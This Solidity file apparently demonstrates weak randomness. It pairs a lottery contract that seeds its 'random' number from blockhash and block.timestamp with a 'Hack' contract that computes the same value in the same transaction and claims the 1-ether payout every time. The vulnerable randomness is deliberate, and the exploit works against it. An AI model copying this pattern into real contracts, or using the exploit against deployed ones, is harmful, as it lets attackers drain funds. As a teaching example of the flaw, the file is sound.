// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract Lottery {
    constructor() payable {}
    function createRandomNumber() public view returns(uint256) {
        // blockhash: hash of the given block - only works for 256 most recent, excluding current, blocks
        // block.timestamp: (uint): current block timestamp as seconds since unix epoch
        // keccak256: compute the Ethereum-SHA-3 (Keccak-256) hash of the (tightly packed) arguments
        // abi.encodePacked: erformes packed encoding of the given arguments
        uint256 rand = uint256(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
        return rand;
    }

    function guess(uint256 _guess) public payable{
        if (_guess == createRandomNumber()) {
            (bool success, ) = payable(msg.sender).call{value: 1 ether}("");
            require(success);
        }
    }
}

contract Hack {
    constructor() payable {}
    receive() external payable {} // make Hack contract ether-receivable
    
    function getFreeEther(Lottery _lottery) public payable {
        uint256 rand =_lottery.createRandomNumber();
        _lottery.guess(rand);
    }
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}